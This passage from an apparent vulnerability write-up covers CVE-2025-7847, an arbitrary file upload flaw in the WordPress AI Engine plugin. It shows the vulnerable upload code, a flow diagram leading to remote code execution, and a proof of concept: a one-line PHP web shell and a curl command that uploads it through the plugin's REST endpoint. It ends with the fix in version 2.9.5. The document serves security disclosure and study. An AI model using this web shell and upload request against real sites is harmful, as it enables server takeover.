</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">copy</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$destination</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;Could not move the file.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">()[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$unique_filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$now</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span> <span class="s1">&#39;Y-m-d H:i:s&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fileId</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">commit_file</span><span class="p">(</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;refId&#39;</span> <span class="o">=&gt;</span> <span class="nv">$refId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;envId&#39;</span> <span class="o">=&gt;</span> <span class="nv">$envId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;purpose&#39;</span> <span class="o">=&gt;</span> <span class="nv">$purpose</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;uploaded&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;created&#39;</span> <span class="o">=&gt;</span> <span class="nv">$now</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;updated&#39;</span> <span class="o">=&gt;</span> <span class="nv">$now</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;expires&#39;</span> <span class="o">=&gt;</span> <span class="nv">$expires</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$destination</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;url&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$metadata</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$metadata</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$metadata</span> <span class="k">as</span> <span class="nv">$metaKey</span> <span class="o">=&gt;</span> <span class="nv">$metaValue</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">add_metadata</span><span class="p">(</span> <span class="nv">$fileId</span><span class="p">,</span> <span class="nv">$metaKey</span><span class="p">,</span> <span class="nv">$metaValue</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="nv">$target</span> <span class="o">===</span> <span class="s1">&#39;library&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">filter_var</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_URL</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">download_url</span><span class="p">(</span> <span class="nv">$path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$tmp</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="nv">$tmp</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$file_array</span> <span class="o">=</span> <span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$unique_filename</span><span class="p">,</span> <span class="s1">&#39;tmp_name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$tmp</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$file_array</span> <span class="o">=</span> <span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$unique_filename</span><span class="p">,</span> <span class="s1">&#39;tmp_name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nx">media_handle_sideload</span><span class="p">(</span> <span class="nv">$file_array</span><span class="p">,</span> <span class="mi">0</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="nv">$id</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">wp_get_attachment_url</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;_mwai_file_id&#39;</span><span class="p">,</span> <span class="nv">$refId</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;_mwai_file_expires&#39;</span><span class="p">,</span> <span class="nv">$expires</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Store additional metadata
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$metadata</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$metadata</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$metadata</span> <span class="k">as</span> <span class="nv">$metaKey</span> <span class="o">=&gt;</span> <span class="nv">$metaValue</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;_mwai_&#39;</span> <span class="o">.</span> <span class="nv">$metaKey</span><span class="p">,</span> <span class="nv">$metaValue</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Store purpose and envId as post meta
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$purpose</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;_mwai_purpose&#39;</span><span class="p">,</span> <span class="nv">$purpose</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$envId</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">&#39;_mwai_envId&#39;</span><span class="p">,</span> <span class="nv">$envId</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nv">$refId</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>upload_file()</code> function handles file storage and names files as follows:</p>
<ul>
<li>Determine filename and extension: if <code>$filename</code> is not provided, extract it from <code>$path</code> and preserve the extension.</li>
<li>Generate a unique filename by concatenating <code>$refId</code> with the extension, then use <code>wp_unique_filename()</code> to avoid collisions in the upload directory.</li>
<li>Save the file: if <code>$target === 'uploads'</code> it copies into the uploads directory, if <code>$target === 'library'</code> it adds it to the Media Library using <code>media_handle_sideload()</code>.</li>
<li>Return <code>$refId</code>. The file is stored as <code>&lt;refId&gt;.&lt;extension&gt;</code> in the uploads directory or Media Library, with metadata if provided.</li>
</ul>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">
graph TD
A["POST /wp-json/mwai/v1/simpleFileUpload"] --> B{"permission_callback"}
B -- Authenticated (X-WP-Nonce or Bearer) --> C["rest_simpleFileUpload()"]
C --> D["simpleFileUpload()"]
D --> E["files->upload_file(tmp_name, name, target, ...)"]
E --> F["Determine extension → newFilename = refId.extension"]
F --> G{"target === 'uploads' ?"}
G -- Yes --> H["copy(path, destination) → file placed in uploads"]
H --> I{"No filetype validation"}
I -- Yes --> J["Uploaded .php accessible via URL"]
J --> L["Response contain URL to file"]
L --> K["Execute PHP → Remote Code Execution (RCE)"]
</pre>
  <pre class="mermaid-dark">
graph TD
A["POST /wp-json/mwai/v1/simpleFileUpload"] --> B{"permission_callback"}
B -- Authenticated (X-WP-Nonce or Bearer) --> C["rest_simpleFileUpload()"]
C --> D["simpleFileUpload()"]
D --> E["files->upload_file(tmp_name, name, target, ...)"]
E --> F["Determine extension → newFilename = refId.extension"]
F --> G{"target === 'uploads' ?"}
G -- Yes --> H["copy(path, destination) → file placed in uploads"]
H --> I{"No filetype validation"}
I -- Yes --> J["Uploaded .php accessible via URL"]
J --> L["Response contain URL to file"]
L --> K["Execute PHP → Remote Code Execution (RCE)"]
</pre>
  <pre class="mermaid-neutral">
graph TD
A["POST /wp-json/mwai/v1/simpleFileUpload"] --> B{"permission_callback"}
B -- Authenticated (X-WP-Nonce or Bearer) --> C["rest_simpleFileUpload()"]
C --> D["simpleFileUpload()"]
D --> E["files->upload_file(tmp_name, name, target, ...)"]
E --> F["Determine extension → newFilename = refId.extension"]
F --> G{"target === 'uploads' ?"}
G -- Yes --> H["copy(path, destination) → file placed in uploads"]
H --> I{"No filetype validation"}
I -- Yes --> J["Uploaded .php accessible via URL"]
J --> L["Response contain URL to file"]
L --> K["Execute PHP → Remote Code Execution (RCE)"]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD
A["POST /wp-json/mwai/v1/simpleFileUpload"] --> B{"permission_callback"}
B -- Authenticated (X-WP-Nonce or Bearer) --> C["rest_simpleFileUpload()"]
C --> D["simpleFileUpload()"]
D --> E["files->upload_file(tmp_name, name, target, ...)"]
E --> F["Determine extension → newFilename = refId.extension"]
F --> G{"target === 'uploads' ?"}
G -- Yes --> H["copy(path, destination) → file placed in uploads"]
H --> I{"No filetype validation"}
I -- Yes --> J["Uploaded .php accessible via URL"]
J --> L["Response contain URL to file"]
L --> K["Execute PHP → Remote Code Execution (RCE)"]
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Create a web shell</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>Upload the web shell</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -X POST <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s2">&#34;http://localhost/wp-json/mwai/v1/simpleFileUpload&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;X-WP-Nonce: 51e6c4a45a&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -F <span class="s2">&#34;file=@rce.php&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -b <span class="s2">&#34;wp-settings-time-1=1762427921;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wordpress_test_cookie=WP%20Cookie%20check;
</span></span></span><span class="line"><span class="cl"><span class="s2">      PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wp_lang=en_US;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wp-settings-5=mfold%3Do;
</span></span></span><span class="line"><span class="cl"><span class="s2">      wp-settings-time-5=1762533510&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --proxy 127.0.0.1:8080 <span class="c1"># Burp proxy</span></span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-11-13-cve-2025-7847/upload.png" title="File uploaded successfully" data-thumbnail="/posts/2025-11-13-cve-2025-7847/upload.png" data-sub-html="<h2>Upload</h2><p>File uploaded successfully</p>"><img loading="lazy" src='/posts/2025-11-13-cve-2025-7847/upload.png' alt="Upload" height="573" width="1545"></a><figcaption class="image-caption">File uploaded successfully</figcaption>
  </figure></p>
<ol start="3">
<li>RCE with the web shell</li>
</ol>
<p><figure><a class="lightgallery" href="/posts/2025-11-13-cve-2025-7847/result.png" title="RCE via uploaded file" data-thumbnail="/posts/2025-11-13-cve-2025-7847/result.png" data-sub-html="<h2>Result</h2><p>RCE via uploaded file</p>"><img loading="lazy" src='/posts/2025-11-13-cve-2025-7847/result.png' alt="Result" height="573" width="1545"></a><figcaption class="image-caption">RCE via uploaded file</figcaption>
  </figure></p>
<h1 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>CVE-2025-7847 is a serious <strong>arbitrary file upload</strong> vulnerability in <strong>AI Engine 2.9.3–2.9.4</strong>, allowing authenticated users (Subscriber+) to upload arbitrary files to the server via the REST API, leading to <strong>RCE</strong>. Version 2.9.5 fixes the issue by adding file type checks (<code>wp_check_filetype</code>).</p>
<h1 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ul>
<li>The vulnerability only applies when the <strong>Public REST API is enabled</strong> and the user has a <strong>valid X-WP-Nonce</strong> or a Bearer token.</li>
<li>Root cause: <strong>missing file type validation</strong> and directly copying the file into uploads.</li>
<li>Mitigation: <strong>update the plugin to 2.9.5</strong>.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"target="_blank" rel="external nofollow noopener noreferrer">Arbitrary File Upload</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload"target="_blank" rel="external nofollow noopener noreferrer">WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Related Content</h2>
    <ul><li>
          <a href="/posts/2025-11-12-cve-2025-32202/" title="CVE-2025-32202 Analysis &amp; POC">CVE-2025-32202 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-11-cve-2025-47637/" title="CVE-2025-47637 Analysis &amp; POC">CVE-2025-47637 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-10-cve-2023-48777/" title="CVE-2023-48777 Analysis &amp; POC">CVE-2023-48777 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-09-cve-2025-1128/" title="CVE-2025-1128 Analysis &amp; POC">CVE-2025-1128 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-22-cve-2025-9501/" title="CVE-2025-9501 Analysis &amp; POC">CVE-2025-9501 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Updated on 2025-11-25 21:12:53">Updated on 2025-11-25&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/5cdc85f0661b8418c6576dd1e38e9367a4445be8" rel="external nofollow noopener noreferrer" target="_blank" title="Update category&#10&#10Commit: 5cdc85f0661b8418c6576dd1e38e9367a4445be8 [5cdc85f]&#10Author: w41bu1&#10Date: 2025-11-25 21:12:53"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>5cdc85f</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2025-11-13-cve-2025-7847/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-13-CVE-2025-7847%5cindex.en.md?plain=1" title="View source"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-13-CVE-2025-7847%5cindex.en.md" title="Edit this page"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-7847&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-7847&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-11-13-cve-2025-7847/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-13-CVE-2025-7847%5cindex.en.md?plain=1%7c" title="Report issue"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file/D:%5cProject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-13-CVE-2025-7847%5cindex.en.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-11-13-cve-2025-7847/" data-title="CVE-2025-7847 Analysis &amp; POC" data-hashtags="analyst,plugin,arbitrary file upload"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-11-13-cve-2025-7847/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/2025-11-13-cve-2025-7847/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2025-11-13-cve-2025-7847/" data-title="CVE-2025-7847 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/analyst/" class="post-tag" title="Tags - Analyst">Analyst</a><a href="/tags/plugin/" class="post-tag" title="Tags - Plugin">Plugin</a><a href="/tags/arbitrary-file-upload/" class="post-tag" title="Tags - Arbitrary File Upload">Arbitrary File Upload</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/2025-11-13-wordpress-vulnerability-sink/" class="post-nav-item" rel="prev" title="WordPress Vulnerability Sinks"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>WordPress Vulnerability Sinks</a><a href="/posts/2025-11-14-cve-2025-9083/" class="post-nav-item" rel="next" title="CVE-2025-9083 Analysis &amp; POC">CVE-2025-9083 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
